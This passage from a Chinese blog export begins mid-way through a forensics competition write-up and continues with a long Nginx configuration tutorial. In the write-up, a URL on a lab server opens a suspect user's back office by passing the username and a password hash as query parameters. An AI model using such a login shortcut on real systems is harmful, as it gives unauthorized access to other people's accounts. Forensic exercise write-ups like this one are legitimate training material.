sql语句查询：\nselect UMJF_JiFen from TU_MJiFen join TU_User on UMJF_UU_Id = UU_Id where UU_Ln = \u0026#39;liyun10\u0026#39; 这就得到了liyun10的余额\n不过这种方法太过麻烦，而且有一定的运气因素，万一猜错了表名什么的就完蛋了\n换一种方式，在用户列表里面直接找到liyun10，进入后台：\n直接访问是失败的：\n在前面加上服务器ip，就能自动跳转到用户后台管理了：\n192.168.1.176/res/aspx/uin.aspx?user=liyun10\u0026amp;pwd=F58249F4A628AE7B35753EA8416BA943\u0026amp;t=fqgl 在结算管理里面找到余额：\n1066449 其实做到这里也就知道为什么之前的方法不能直接找到用户余额表了，因为之前登录的管理员账号使用的结算管理页面.aspx文件和用户使用的不一样，我直接找只能找到管理（？的余额，总之不是liyun10的\n另外，直接看数据库余额是有小数部分的，但是答案格式只说是\u0026quot;123456\u0026quot;这样的纯数字，不知道会不会有冲突\n49.接上一题，该用户的推广ID是 链接代码中能看见：\nd0fdd7a9a010d37e 50.接上一题，该代理商户的最后一次登陆时间是 登录日志里面啥也没有，注册信息里面倒是有：\n2016/9/5 17:09:13 总算是做完了，part4真的是异常的艰难啊\n","date":"2025-07-26T13:22:12+08:00","image":"http://picture.928330.xyz/typora/f99f347d5c5b4907bc54e0e6b9b714e8.png","permalink":"https://blog.928330.xyz/p/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"长安杯2020取证总结"},{"content":"开玩笑的，其实nginx和apache一样好用\napache移步：Apache入门 什么是Nginx Nginx（发音为 \u0026ldquo;engine-X\u0026rdquo;）是一款开源的、高性能的HTTP和反向代理服务器\n它的设计哲学是提供极致的性能、稳定性、丰富的功能、简单的配置和低资源消耗，看上去就很厉害\nNginx采用事件驱动的异步非阻塞架构\n与传统的Apache等服务器为每个请求创建一个新进程或线程不同，Nginx使用一个主进程和少数几个工作进程\n主进程负责读取配置、管理工作进程，而真正处理网络请求的是工作进程\n每个工作进程都是单线程的，异步地处理成千上万个并发连接\n这种模型避免了创建和销毁进程/线程的开销以及上下文切换的成本，因此能以极低的内存占用应对高并发场景\n接下来我们会介绍直接安装的Nginx，也会顺带介绍通过Docker容器启动的Nginx\n二者在活动状态控制和日志方面有些区别，配置基本一致\n主要用法 Web服务器 直接向客户端提供静态资源（如HTML、CSS、图片）的服务\n由于其高效的文件读取和网络传输能力，Nginx在处理静态内容方面表现极其出色,适合搭建博客\n反向代理服务器 它是是客户端和后端真实服务器之间的中间人\n它可以将客户端请求转发到后端的应用服务器（如Node.js、Java、Python应用），并将后端响应返回给客户端，从而实现请求分发、负载均衡，并能隐藏后端服务的真实IP和端口，提升安全性\n负载均衡器 当后端有多台服务器时，Nginx可以根据预设的策略将请求分发到这些服务器上，从而分担单一服务器的压力\nAPI网关 在微服务架构中，Nginx可以作为所有API请求的统一入口，执行如身份验证、速率限制、日志记录、服务发现等通用功能\n目录结构 不同来源 通过不同方式安装的nginx的默认目录结构都会有所差别\n官方Nginx包（从 nginx.org） 从Nginx下载官方提供的.rpm/.deb包安装\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件（Nginx 的核心配置） │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录（用于虚拟主机） │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ ├── sbin/ │ │ └── nginx # 主程序二进制文件 │ └── share/ │ └── nginx/ │ └── html/ # 默认 Web 根目录 │ ├── index.html # 默认欢迎页面 │ └── 50x.html # 服务器错误页面（如 500、502） │ ├── var/ │ └── log/ │ └── nginx/ # 日志文件目录 │ ├── access.log # 访问日志 │ └── error.log # 错误日志 │ └── lib/ └── systemd/ # 服务管理相关 └── system/ # Nginx systemd 配置 └── nginx.service 源码编译安装 从Nginx官方下载源码.tar.gz，自己编译安装\n/ # 根目录 └── usr/ └── local/ └── nginx/ ├── sbin/ │ └── nginx # 主程序二进制文件 ├── conf/ │ ├── nginx.conf # 主配置文件 │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录 │ └── default.conf # 默认网站配置文件 ├── html/ # 默认 Web 根目录 │ ├── index.html # 默认欢迎页面 │ └── 50x.html # 服务器错误页面 └── logs/ # 日志文件目录 ├── access.log # 访问日志 └── error.log # 错误日志 Debian/Ubuntu官方仓库 通过apt安装\n虽然apt也是调用dpkg安装.deb包，但debian/ubuntu维护的.deb包和官方打包的不太一样，因此web根目录等等路径和直接使用官方包安装会有所差别\n一般偏向Debian系列的“sites-available / sites-enabled” 设计，也就是apache那样\n/ ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件 │ ├── mime.types # MIME类型映射表 │ ├── conf.d/ # 可选，通常空的，给用户放额外配置 │ ├── sites-available/ # 所有站点配置（未必启用） │ │ └── default # 默认网站配置文件 │ └── sites-enabled/ # 启用的站点（使用符号链接到sites-available即为启用） │ └── default -\u0026gt; ../sites-available/default │ ├── usr/ │ └── sbin/ │ └── nginx # 主程序二进制文件 │ ├── var/ │ ├── www/ │ │ └── html/ # 默认 Web 根目录 │ │ ├── index.nginx-debian.html # 默认欢迎页面 │ │ └── 50x.html # 服务器错误页面 │ └── log/ │ └── nginx/ # 日志文件目录 │ ├── access.log │ └── error.log │ └── lib/ └── systemd/ └── system/ └── nginx.service # systemd 单元文件 CentOS/RHEL官方仓库 通过yum/dnf安装\n路径、配置和布局就是官方Nginx提供的.rmp包规范的结构，所以和第一种很像\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件 │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录（用于虚拟主机） │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ └── sbin/ │ └── nginx # 主程序二进制文件 │ ├── usr/ │ └── share/ │ └── nginx/ │ └── html/ # 默认 Web 根目录 │ ├── index.html # 默认欢迎页面 │ └── 50x.html # 服务器错误页面 │ ├── var/ │ └── log/ │ └── nginx/ # 日志文件目录 │ ├── access.log # 访问日志 │ └── error.log # 错误日志 │ └── usr/ └── lib/ └── systemd/ # 服务管理相关 └── system/ # Nginx systemd 配置 └── nginx.service Docker镜像（官方 Nginx） 没有固定结构\n因为Docker镜像只是一个文件系统的快照，完全取决于镜像制作者，具体看上面四种\n这里以官方镜像为例\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件（Nginx 的核心配置） │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录（用于虚拟主机） │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ ├── share/ │ │ └── nginx/ │ │ └── html/ # 默认的 Web 根目录 │ │ ├── index.html # 默认欢迎页面 │ │ └── 50x.html # 服务器错误页面（如 500、502） │ └── sbin/ │ └── nginx # 主程序二进制文件 │ └── var/ └── log/ └── nginx/ # 日志文件目录（部分精简镜像无日志输出） ├── access.log # 访问日志（默认可能未启用） └── error.log # 错误日志（默认可能未启用） 宝塔面板安装的Nginx 宝塔不会用系统默认路径，而是自定义了一套目录结构\n这其实是方便面板统一管理多个网站、日志和SSL证书，也方便我们寻找\n/ # 根目录 ├── www/ │ ├── wwwroot/ # 网站根目录（每个站点一个子目录） │ │ ├── example.com/ # example.com 站点目录 │ │ │ ├── index.html # 网站首页 │ │ │ └── ... # 网站源码/文件 │ │ └── OtherSite.com/ # 其他站点 │ │ │ ├── wwwlogs/ # 所有网站的日志（不区分文件夹） │ │ ├── example1.com.log │ │ └── example1.com.error.log │ │ └── example2.com.log │ │ └── example2.com.error.log │ │ └── ... │ │ │ └── server/ # 宝塔自身运行目录 │ ├── panel/ # 宝塔面板核心 │ ├── nginx/ # Nginx 配置与二进制 │ │ ├── conf/nginx.conf # 主配置文件 │ │ ├── conf/vhost/ # 各站点虚拟主机配置 │ │ │ ├── example.com.conf │ │ │ └── other-site.com.conf │ │ └── logs/ # Nginx 全局日志 │ │ ├── access.log │ │ └── error.log │ └── php/ # PHP 版本管理 │ ├── 74/ # PHP 7.4 │ └── 81/ # PHP 8.1 │ └── etc/ └── init.d/nginx # 启动脚本（也可能链接到 systemd） 一些问题 日志文件 在编译安装（make install）的传统方式中，Nginx日志会记录在：\n/usr/local/nginx/logs/ 在.deb包和系统包安装（apt/yum）的方式中，Nginx日志会记录在：\n/var/log/nginx/ 在宝塔面板安装方式中，日志位置有两个：\n/www/wwwlogs/ # 每个站点一个日志文件，包含访问和错误日志 /www/server/nginx/logs/ # Nginx全局日志（access.log、error.log） 访问日志：如果某个站点配置了自己的access_log，那么它的请求不会再写到全局access.log\n错误日志：全局错误（服务器级别的错误，而不是单个站点的错误），以及所有站点的严重错误（crit、alert、emerg，具体看：错误等级 )，会进入全局error.log\n在Docker官方镜像中，日志默认不写入上面的文件，而是输出到标准输出和标准错误\n执行以下命令：\nls -l /var/log/nginx/ 我们可以看到如下输出：\nlrwxrwxrwx 1 root root 11 Jul 15 01:14 access.log -\u0026gt; /dev/stdout lrwxrwxrwx 1 root root 11 Jul 15 01:14 error.log -\u0026gt; /dev/stderr 虽然nginx.conf配置的是/var/log/nginx/access.log，但由于它是个符号链接，等于就是输出到了标准输出\n这些输出会被记录到docker容器的日志里，docker中查看日志的方式：\ndocker logs \u0026lt;容器ID\u0026gt;/\u0026lt;名称\u0026gt; 配置文件 Nginx的主配置文件一般在：\n/etc/nginx/nginx.conf 在这个文件中常见的一行是：\ninclude /etc/nginx/conf.d/*.conf; 💡 Tip include是Nginx配置语言中的指令，用于引入其他配置文件\n不同安装方式下，include的目录略有差异：\nCentOS / RHEL / Fedora官方包\ninclude /etc/nginx/conf.d/*.conf; Debian / Ubuntu官方包\ninclude /etc/nginx/sites-enabled/*; 配置分两部分：\n/etc/nginx/sites-available/：存放所有站点配置\n/etc/nginx/sites-enabled/：通过符号链接指向/etc/nginx/sites-available/下的配置，以启用站点\n源码编译安装\n通常不会使用include，也不会自动拆分conf.d/或sites-enabled/，默认是：\n/usr/local/nginx/conf/nginx.conf 宝塔面板安装\n宝塔为了方便面板管理，使用了自己的路径布局，主配置文件：\n/www/server/nginx/conf/nginx.conf 在这个文件中，宝塔会包含：\ninclude /www/server/panel/vhost/nginx/*.conf; 每个站点在/www/server/panel/vhost/nginx/下生成一个独立的.conf文件，例如：\n/www/server/panel/vhost/nginx/example.com.conf /www/server/panel/vhost/nginx/test.com.conf 这就是为什么宝塔能通过Web面板为每个站点单独管理配置\nWeb根目录 不同安装方式下，Nginx的默认Web根目录不同\n在编译安装（make install）的传统方式中，Web根目录在：\n/usr/local/nginx/html/ 默认包含以下文件：\nindex.html # 默认欢迎页面 50x.html # 服务器错误页面 在Debian/Ubuntu系统包安装方式中，Web根目录在：\n/var/www/html/ 在官方包和CentOS/RHEL系统包安装方式中，Web根目录在：\n/usr/share/nginx/html/ 在宝塔面板安装方式中，Web根目录在：\n/www/wwwroot/\u0026lt;domain\u0026gt;/ domain是不同的站点，宝塔会为他们各自创建一个根目录，例如：\n/www/wwwroot/example.com/ /www/wwwroot/www.gSJKsu2kig.com/ 可以通过修改Nginx配置文件中的root指令来改变Web根目录：\nserver { listen 80; server_name localhost; root /path/to/your/webroot; index index.html; } 指定根目录在管理的时候很有用，因为默认都挤在一起了，关于server块我们后面会细讲\n二进制文件位置 系统包安装（apt/yum/dnf 安装）\n一般放在sbin，而不是bin\n/usr/sbin/nginx 源码编译安装\n编译安装时位置完全取决于--prefix参数，下面是默认位置：\n/usr/local/nginx/sbin/nginx 宝塔安装\n/www/server/nginx/sbin/nginx /www/server/nginx/conf/nginx.conf 但是它会在/usr/bin/nginx或/usr/sbin/nginx下做一个软链接，指向上面的位置，方便在命令行里直接运行 nginx\nsystemd的位置 其实这个不是nginx的问题，而是一个历史问题 —— linux文件系统的演进\n**FHS，全称Filesystem Hierarchy Standard（文件系统层次结构标准）**是 Linux 系统的一个标准，规定了 目录结构、文件存放位置及用途，让不同 Linux 发行版在文件布局上保持一致性\n在早期，FHS规定/lib/用于存放核心库文件和与系统启动紧密相关的可执行文件（比如init系统所需的库、二进制），而/usr/lib/用于存放非核心、额外安装的软件库\n但在systemd出现后，由于systemd的服务单元文件属于系统服务配置，与系统启动密切相关，但又不是二进制程序本身，于是他的位置有了一些不同：\nDebian/Ubuntu\n选择/lib/systemd/system/放置核心包的单元文件（比如nginx、sshd），保证系统启动时总能找到\nCentOS/RHEL/Fedora\n更倾向使用/usr/lib/systemd/system/，虽然/lib/systemd/system/也存在，但它通常是指向前者的符号链接\n宝塔面板\n遵循上面两条，但一般会在/etc/init.d/nginx或/etc/init.d/bt下放置额外的启动脚本，以便面板通过Web界面统一管理\n现在/lib/和/usr/lib/往往通过软链接或包管理器自动管理，保证旧路径和新路径都能访问到服务单元文件，所以我们会看到同样的Nginx服务在不同发行版或者不同安装方式下，路径可能不同\n常用命令 Nginx直接安装在本机时，使用systemctl或者service命令控制\n通过Docker容器使用时，就按照Docker容器的使用方法（没用过看这里：快速上手Docker ）\n下面介绍一些Nginx本身的命令：\n查看版本 nginx -v 输出当前安装的Nginx版本号，用于确认是否正确安装Nginx及其版本信息\n检查配置文件语法 nginx -t 在每次修改配置文件后必须执行\n使用后，主进程会fork一个临时子进程，子进程尝试解析所有配置文件，但不会绑定端口或真正启动服务\n若语法无误，会提示syntax is ok和 test is successful\n若有错误，会明确指出是哪一行、哪个文件配置有误\n重新加载配置文件 nginx -s reload 强制停止 nginx -s stop 配置文件 Nginx的所有功能都是通过配置文件nginx.conf来驱动的\n该文件主要由多个配置块组成，这些块由花括号{}界定，可以嵌套，形成了层级分明的结构\n一个典型的nginx.conf结构如下：\nnginx.conf ├── 全局块 ├── events块 └── http块 └── server块（可多个） └── location块（可多个） 具体示例如下：\nuser nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; } } } 全局块 位于配置文件顶部，未嵌套于任何块中\n用于配置Nginx整体运行环境，影响所有子模块\nuser nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; user：指定运行工作进程的用户和用户组\nworker_processes：指定工作进程数量\nauto表示自动与 CPU 核心数一致\nerror_log：设置错误日志的路径和日志级别\n每条错误日志条目都会带有一个严重性等级，这些等级是代码里写死的，作为用户无法改变某个错误属于什么等级\nNginx支持的日志级别（从高到低）如下：\n级别 描述 debug 记录所有信息，主要用于开发或调试，信息量极大，通常需编译时启用 info 普通信息，如配置加载成功、进程启动、连接创建等 notice 正常但重要的事件，如配置文件重载、进程关闭等 warn 警告信息，非致命错误，比如配置中存在问题但可以忽略或继续运行 error 运行过程中出现的错误，如连接失败、服务不可达等 crit 严重错误，Nginx可能无法继续运行 alert 必须立刻处理的严重问题 emerg 紧急状态，比如系统崩溃，Nginx无法启动 是否写入日志文件取决于LogLevel设置的阈值，只会写入大于等于当前设置等级的错误事件\n生产环境通常设置为warn以捕捉重要问题，同时避免日志泛滥\npid：指定记录主进程PID的文件路径\nevents块 紧随全局块之后，一级块\n用于配置与网络连接处理相关的指令，影响工作进程的并发性能\nevents { worker_connections 1024; } worker_connections：每个工作进程可同时处理的最大连接数\n总并发连接数约为worker_processes * worker_connections\nhttp块 紧随events块之后，一级块\n用于配置HTTP协议相关的指令，是配置Web服务的核心部分\nhttp { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; keepalive_timeout 65; server { ... } } include：引入外部文件\n这里/etc/nginx/mime.types用于MIME类型配置\ndefault_type：未明确 MIME 类型时的默认类型\nlog_format：定义日志名称与格式\naccess_log：指定访问日志的输出路径及格式\nsendfile：启用高效文件传输方式\ntcp_nopush：优化网络传输性能，避免频繁发送小包\nkeepalive_timeout：设置长连接超时时间\nserver块 嵌套于http块内部，二级块，可存在多个，用于配置多个虚拟主机\n用于定义单个虚拟主机的配置，通过监听端口和服务器名称对请求进行分发\nserver { listen 80; server_name localhost; location / { ... } } listen：设置监听的端口\n只有访问主机该端口的请求才会被接受\n不过得注意，如果使用docker，docker容器一般会把这个端口转发到主机的某个端口上\n基本用法：\nlisten \u0026lt;地址\u0026gt;:\u0026lt;端口\u0026gt; [参数]; 地址（可选）：指定绑定的 IP（默认是所有IP）\n端口：监听的端口\n参数（可选）：例如default_server、ssl、http2 等（我们后面都会提到）\n有一个比较特殊的参数：default_server，用来指定默认的server块，当Nginx收到请求但找不到任何server_name匹配时，就会使用这个默认配置来处理请求\n介绍几种常见listen字段写法：\n80：监听所有IP的80端口（80是默认HTTP端口），相当于0.0.0.0:8080\n127.0.0.1:8080：仅监听本地回环地址的8080端口\n[::]:80：IPv6地址监听80端口\nserver_name：匹配请求的主机名或域名\n只有请求头中的Host字段符合，Nginx才会把请求交给这个server块处理\n可以在server_name中写多个值，也支持通配符*，也可以使用_表示任何Host值\n如果不写这个字段，http块又只有一个server，那么这个server块会所有请求都匹配（包括 IP）\n如果不写这个字段，http块又有多个server，那么这个server块会作为默认server，处理未匹配的请求\nlocation块 嵌套于server块内部，三级块\n用于对URI（注意不是URL）进行匹配，制定请求的处理方式，如资源路径、代理规则等\nlocation / { root /usr/share/nginx/html; index index.html index.htm; } location：用于匹配客户端请求的URI\n示例这里是匹配以/开头的URI（实际上就是匹配所有请求，因为URI就是以/开头的）\n此外，Nginx提供多种匹配方式，优先级不同：\n类型 语法 示例 说明 精确匹配 = location = /login {} 仅匹配 URI 等于 /login 的请求 前缀匹配 / location /images/ {} 匹配以 /images/ 开头的 URI 正则匹配 ~（区分大小写）\n~*（不区分大小写） location ~ \\.php$ {} 使用正则表达式匹配 URI 优先匹配 ^~ location ^~ /static/ {} 前缀匹配优先于正则匹配 root：设置请求资源的根目录路径\n当一个请求到达时，Nginx会将请求的URI拼接到这个路径后面，以确定文件的具体位置\n如果客户端访问/index.html，那么实际访问的是服务器上的/usr/share/nginx/html/index.html文件\nindex：指定访问目录时的默认文件名称\n如果用户访问的是目录而不是具体文件，Nginx会在/usr/share/nginx/html/目录下按顺序查找：\nindex.html index.htm 只要找到其中一个文件，就立即返回该文件作为响应；如果都找不到，会返回403（禁止访问）或404（未找到），视配置而定\nroot和index也可以直接写在server块里面，作为所有location块的默认值\n说了这么多，我们最后总结一下listen、server_name、location 三者是如何配合工作的：\n用户访问浏览器输入：\nhttp://localhost/images/logo.png Nginx内部处理流程如下：\n看端口： 该请求是发给哪个端口，是80，那就匹配所有listen 80的server\n看Host头： Host是localhost，找哪个server_name匹配上了，进入该server块\n看URI： URI是/images/logo.png，在这个server中找哪个location匹配得最好，执行该location的规则\n核心功能 —— Web服务 Web 服务是 Nginx 最基础，也是最核心的功能，它能够高效地处理客户端对静态资源的请求\n这主要通过server块中的root、index、location来协同完成\n部署静态资源 可以把Nginx作为静态资源服务器，当用户请求时，Nginx从服务器的指定文件路径中查找并返回对应的文件：\nserver { listen 80; server_name example.com; root /var/www/my-project/public; index index.html index.htm; location / { try_files $uri $uri/ =404; } location ~* \\.(jpg|jpeg|gif|png|css|js|ico|webp)$ { expires 30d; } } try_files $uri $uri/ =404\n这是一个非常强大的指令，常用于处理单页应用（SPA）的路由，它的语法是：\ntry_files file1 file2 ... final_action; file1, file2, ...：依次判断路径（支持变量），是否存在有效文件或目录 final_action：如果前面都没找到，则执行的动作，常用的有： =404：返回404错误 @named_location：跳转到命名的location块 uri：重定向到指定URI 现在我们看看示例里面的是什么意思：\ntry_files $uri $uri/ =404 $uri：尝试将URI直接作为文件名进行查找\n$uri/：如果上一步失败，则尝试将URI作为一个目录名，并在该目录下查找由index指令定义的文件\n=404：如果前两步都失败，则返回一个404 Not Found错误\nlocation ~* \\.(jpg|jpeg|gif|png|css|js|ico|webp)$\n这是一个正则匹配，~*表示不区分大小写的正则，它会匹配所有以上述后缀结尾的请求\nexpires 30d\n用于设置HTTP响应头中的Expires和Cache-Control\n告诉客户端浏览器可以将这些静态资源缓存30天，从而减少不必要的请求，提升后续访问速度\nURL重写与跳转 Nginx支持在location块内实现URL重写和跳转，常用于：\n伪静态（SEO优化） 页面重定向 接口调整兼容 HTTPS 强制跳转等场景 rewrite rewrite是Nginx实现伪静态、内部跳转的主要方式\n它的本质是把用户请求的路径改写成另一个内部路径，再由Nginx重新处理\n基本语法 rewrite \u0026lt;正则匹配\u0026gt; \u0026lt;重写路径\u0026gt; [flag]; 正则匹配：对当前请求URI进行匹配（不包含域名）\n重写路径：替换匹配url的新URI，可引用正则中的子表达式\nflag 可选标志：\n重写方式 用法 含义 last 使用新URI，从头开始匹配location 用于常规重写，不会改变浏览器地址栏 break 使用新URI，但不再重新匹配location 跳出rewrite，在当前location内继续执行\n不会改变浏览器地址栏 permanent 返回301，永久重定向 会改变浏览器地址栏 redirect 返回302，临时重定向 会改变浏览器地址栏 伪静态处理 将 /product/123.html 重写为 /product.php?id=123：\nrewrite ^/product/([0-9]+)\\.html$ /product.php?id=$1 last; 隐藏真实路径 location /user/ { rewrite ^/user/([a-z]+)$ /profile.php?name=$1 last; } return return用于向客户端返回一个特定的状态码和内容，它不会再走rewrite的内部处理流程\n比起rewrite，它更适合用于明确的重定向、报错处理等\n基本语法 return \u0026lt;状态码\u0026gt; [文本|URL]; 状态码：如301（永久重定向）、302（临时重定向）、403（禁止访问）、404（页面不存在） 文本或URL：可返回跳转地址，也可直接返回文本内容（仅在状态码为200时有效） HTTP强制跳转HTTPS server { listen 80; server_name example.com; return 301 https://$server_name$request_uri; } 这一点我们下面会详细说明\n禁止访问某个目录 location /private/ { return 403; } 简洁跳转到首页 location = / { return 301 /home/index.html; } 纯文本响应 location = /test { return 200 \u0026#39;Hello.\u0026#39;; } 配置HTTPS服务 为网站启用HTTPS可以对客户端和服务器之间的传输数据进行加密，确保数据安全\n配置前，我们需要从证书颁发机构（CA）获取SSL/TLS证书文件和私钥文件\nserver { listen 443 ssl http2; server_name yourdomain.com; ssl_certificate /path/to/fullchain.pem; ssl_certificate_key /path/to/privkey.pem; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers \u0026#39;TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384\u0026#39;; ssl_prefer_server_ciphers off; root /var/www/my-project/public; index index.html; location / { try_files $uri $uri/ =404; } } server { listen 80; server_name yourdomain.com; return 301 https://$server_name$request_uri; } listen 443 ssl http2\n443是HTTPS的标准端口\nssl参数表示在此端口上启用SSL/TLS加密\nhttp2参数表示同时启用HTTP/2协议，它可以显著提升页面加载性能\nssl_certificate\n指定证书文件的路径，这通常是.pem或.crt格式的公钥证书链文件\nssl_certificate_key\n指定与证书配对的私钥文件的路径，通常是.key格式\nssl_session_cache\n开启SSL会话缓存，用于复用TLS握手过程，提升性能\nssl_session_timeout\n设置SSL会话的有效时间\nssl_protocols TLSv1.2 TLSv1.3\n指定只使用安全的TLS协议版本，废弃老旧且不安全的SSLv3, TLSv1.0, TLSv1.1\nssl_ciphers\n指定加密时使用的加密套件列表，配置安全的套件可以防止降级攻击\nssl_prefer_server_ciphers\n是否优先使用服务器端指定的加密套件，off表示客户端优先\nreturn 301 https://$server_name$request_uri\n发送一个永久重定向的HTTP状态码\n$server_name和$request_uri是Nginx变量，分别代表当前请求的域名和完整的 URI（包含参数）\n这能确保用户访问任何HTTP页面时都能被准确地重定向到对应的HTTPS版本\n核心功能 —— 反向代理 反向代理是Nginx的一个核心功能\nNginx作为一个中间层，接收客户端的请求，再将请求转发给后端服务器处理，然后将响应返回给客户端\n这种方式的好处包括：\n可以隐藏后端服务器的真实地址和结构 可以统一对外的入口，便于安全控制和运维管理 可以实现负载均衡、高可用等复杂功能（后续再讲） 下面是一个最简单的Nginx配置示例，只实现把请求转发到后端服务器的功能：\nserver { listen 80; server_name www.example.com; location / { proxy_pass http://127.0.0.1:3000; } } proxy_pass http://127.0.0.1:3000;\n这是反向代理的核心语句，即将匹配到的请求转发到本机的3000端口，由本地某个服务来实际处理请求\n默认情况下，Nginx把请求转发给后端时，不会携带原始客户端的信息\n如果后端服务要获取用户的真实IP、请求协议、原始域名等信息，就需要使用proxy_set_header来手动设置：\nserver { listen 80; server_name www.example.com; location / { proxy_pass http://127.0.0.1:3000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 这些proxy_set_header是给后端应用用的：\nHost $host：原始请求中的主机名 X-Real-IP $remote_addr：客户端的真实 IP X-Forwarded-For $proxy_add_x_forwarded_for：经过的所有代理 IP 列表 X-Forwarded-Proto $scheme：原始请求的协议（http 或 https） 如果我们有多个后端服务（比如多个进程、多个机器），可以用upstream来统一管理后端服务器组：\nupstream backend { server 127.0.0.1:3000; # server 127.0.0.1:3001; #可以添加多个 } server { listen 80; server_name www.example.com; location / { proxy_pass http://backend; #\u0026lt;--这里不一样了，使用的是upstream proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 现在，我们只需要在proxy_pass中写 http://backend即可\n具体的地址都集中写在upstream backend块中，方便管理和负载均衡\n核心功能 —— 负载均衡 当upstream块中定义了多台server时，Nginx就自然地成为了一个负载均衡器\n它会根据指定的策略将请求分发到不同的服务器，以分担流量压力\nHTTP负载均衡配置 upstream backend_cluster { server backend1.example.com weight=5; server backend2.example.com; server backend3.example.com backup; server backend4.example.com down; } server { listen 80; location / { proxy_pass http://backend_cluster; proxy_connect_timeout 5s; proxy_read_timeout 10s; } } weight=5\n为服务器设置权重，在默认的轮询策略下，权重越高的服务器接收到的请求比例就越高\n这里backend1的请求量大约是backend2的5倍\nbackup\n将服务器标记为备用服务器\n只有当所有非备用的主服务器都无法访问时，Nginx才会将请求转发给它\ndown\n将服务器标记为永久下线，Nginx不会向它转发任何请求\n这通常用于服务器维护\nproxy_connect_timeout \u0026amp; proxy_read_timeout\n设置Nginx与后端服务器建立连接的超时时间和读取响应的超时时间\n可以防止因个别后端服务响应缓慢而导致请求长时间挂起\n负载均衡策略 轮询 默认策略，无需任何指令\n请求被按顺序、轮流分发到每台服务器，并考虑权重\n权重（weight） 就像我们之前提到过的例子，weight越高，分配的请求越多\n此策略适合后端性能不一致的情况（强机多干活）\nupstream backend_cluster { server 192.168.0.1 weight=3; server 192.168.0.2 weight=1; } 上例中，第一个服务器将获得大约75%的请求，第二个约25%\nIP哈希（ip_hash） 根据客户端IP地址的哈希值来选择服务器，这能确保来自同一个客户端的请求始终被定向到同一台后端服务器\n此策略对于需要保持用户会话状态的应用非常重要\nupstream backend_cluster { ip_hash; server backend1.example.com; server backend2.example.com; } 最少连接 (least_conn) 将新请求发送到当前活动连接数最少的服务器\n此策略在处理耗时不同或长连接较多的请求时，能使负载分布得更加均匀\nupstream backend_cluster { least_conn; server backend1.example.com; server backend2.example.com; } 核心功能 —— TCP/UDP代理 Nginx不仅能代理HTTP，还能通过stream模块在更底层的传输层（TCP/UDP）进行代理\n例如代理数据库连接、游戏服务器、DNS 查询等\nstream块必须配置在http块之外，位于主配置文件的顶层，和http是平级的\nstream { upstream mysql_cluster { server 192.168.1.101:3306 weight=2; server 192.168.1.102:3306; } server { listen 3307; proxy_pass mysql_cluster; proxy_timeout 20s; } server { listen 53 udp; proxy_pass 8.8.8.8:53; } } 可以看到，stream块和http块的写法基本上是一样的，但是细节上还是有些不同：\nstream块不支持location，没有路径匹配 stream块不解析协议内容，没有proxy_set_header，只转发原始TCP/UDP数据流 stream块不支持ip_hash的负载均衡策略 日志分析 为何要分析Nginx日志 在现代 Web 架构中，Nginx 作为流量的入口，记录着大量有用的信息\n虽然ELK等日志平台功能强大，但并非所有环境都配备\n掌握底层的命令行分析技巧，能让我们在任何服务器上快速、灵活地定位问题\n注意：\n在处理大型日志文件（如 \u0026gt;1GB）时，应避免直接使用cat读取整个文件，这会消耗大量内存\n应使用head,tail,grep,sed,awk等可以流式处理的工具进行查看修改，或先对日志进行切割\n实在想要看全部，也应该选择使用less或more\n日志类型与格式 访问日志（access.log） access.log记录了每一个对Nginx服务器的HTTP请求的详细信息\n默认格式：combined / main Nginx官方默认格式是combined，不过现在常见的更多是main（包括之前我们给出的docker容器的nginx）\n其实main只是自定义的名字，本质和combined是类似的，甚至很多公司就是直接copy默认的combined格式起个名叫main，但更多的则是增加了一些字段（比如新增$http_x_forwarded_for字段）\n我们就以上文提到的配置文件示例里的main格式为例，这也是最为常见的格式之一，理解了就行\nlog_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; 